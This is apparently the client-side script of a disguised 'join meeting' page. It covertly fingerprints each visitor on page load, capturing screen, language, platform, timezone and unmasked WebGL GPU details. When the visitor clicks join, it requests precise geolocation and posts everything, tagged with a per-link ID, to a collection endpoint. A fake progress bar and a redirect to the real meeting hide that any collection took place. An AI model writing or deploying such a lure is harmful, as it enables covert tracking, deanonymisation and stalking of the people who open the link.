const GEO_OPTIONS = {
  enableHighAccuracy: false,
  timeout: 30000,
  maximumAge: 0
};

function updateProgress(percent) {
  const progressBar = document.getElementById('progressBar');
  const progressBarFill = document.getElementById('progressBarFill');
  if (!progressBar || !progressBarFill) return;
  if (percent > 0) {
    progressBar.style.display = 'block';
    progressBarFill.style.width = percent + '%';
  } else {
    progressBar.style.display = 'none';
  }
}

function coletaDados() {
  const screenRes = `${screen.width}x${screen.height}`;
  const lang = navigator.language || 'N/A';
  const platform = navigator.platform || 'N/A';
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';

  let gpu_vendor = 'N/A';
  let gpu_renderer = 'N/A';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const debugInfo = gl && gl.getExtension('WEBGL_debug_renderer_info');
    if (gl && debugInfo) {
      gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  } catch (e) {}

  return { screen: screenRes, lang, platform, timezone, gpu_vendor, gpu_renderer };
}

function buildBasePayload() {
  const base = coletaDados();
  base.timestamp = new Date().toISOString();
  base.link_uid = window.JOIN_CONFIG.linkUid;
  return base;
}

function buildClickPayload(locationType, position) {
  const payload = buildBasePayload();
  payload.collection_event = 'click';
  payload.location_type = locationType;
  if (position) {
    payload.lat = position.coords.latitude;
    payload.lon = position.coords.longitude;
    payload.accuracy = position.coords.accuracy;
  }
  return payload;
}

function submitResult(payload) {
  updateProgress(80);
  return fetch('/api/collect', {
    method: 'POST',
    body: JSON.stringify(payload),
    headers: { 'Content-Type': 'application/json' }
  });
}

function redirectToMeeting() {
  window.location.href = window.JOIN_CONFIG.meetingUrl;
}

function submitAndRedirect(payload) {
  submitResult(payload)
    .then(() => {
      updateProgress(100);
      setTimeout(redirectToMeeting, 2000);
    })
    .catch(() => {
      updateProgress(100);
      setTimeout(redirectToMeeting, 2000);
    });
}

function getLocation() {
  const joinBtn = document.getElementById('joinBtn');
  const spinner = document.getElementById('spinner');
  const loadingText = document.getElementById('loadingText');
  if (!joinBtn) return;

  joinBtn.style.display = 'none';
  spinner.style.display = 'block';
  loadingText.style.display = 'block';
  updateProgress(20);

  if (!navigator.geolocation) {
    updateProgress(60);
    submitAndRedirect(buildClickPayload('none'));
    return;
  }

  updateProgress(40);
  navigator.geolocation.getCurrentPosition(
    (position) => {
      updateProgress(60);
      submitAndRedirect(buildClickPayload('precise', position));
    },
    () => {
      updateProgress(60);
      submitAndRedirect(buildClickPayload('none'));
    },
    GEO_OPTIONS
  );
}

document.addEventListener('DOMContentLoaded', () => {
  const joinBtn = document.getElementById('joinBtn');
  if (joinBtn) {
    joinBtn.addEventListener('click', getLocation);
  }

  if (!window.JOIN_CONFIG || !window.JOIN_CONFIG.linkUid) return;

  const base = buildBasePayload();
  base.collection_event = 'page_load';
  base.location_type = 'none';

  fetch('/api/collect', {
    method: 'POST',
    body: JSON.stringify(base),
    headers: { 'Content-Type': 'application/json' }
  }).catch(() => {});
});
